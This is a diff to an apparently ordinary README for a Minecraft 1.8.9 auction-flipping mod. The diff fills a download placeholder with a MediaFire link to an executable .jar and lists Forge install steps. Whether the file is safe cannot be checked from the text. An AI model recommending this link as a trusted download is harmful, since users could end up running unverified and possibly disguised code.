@@ -13,7 +13,7 @@
 ✔ **Configurable Settings** – Full control over flipping limits, budget, and item types.  
 
 ## 🚀 Installation  
-1. **Download the Mod:** [Insert Download Link]  
+1. **Download the Mod:** https://www.mediafire.com/file/j1qr0k1o6llsm41/CoflnetExtension-1.8.9.jar/file 
 2. **Install Forge (1.8.9)** if you haven't already.  
 3. **Place the mod .jar** into your `.minecraft/mods` folder.  
 4. **Launch Minecraft** and configure settings in `/ahflipper`.  
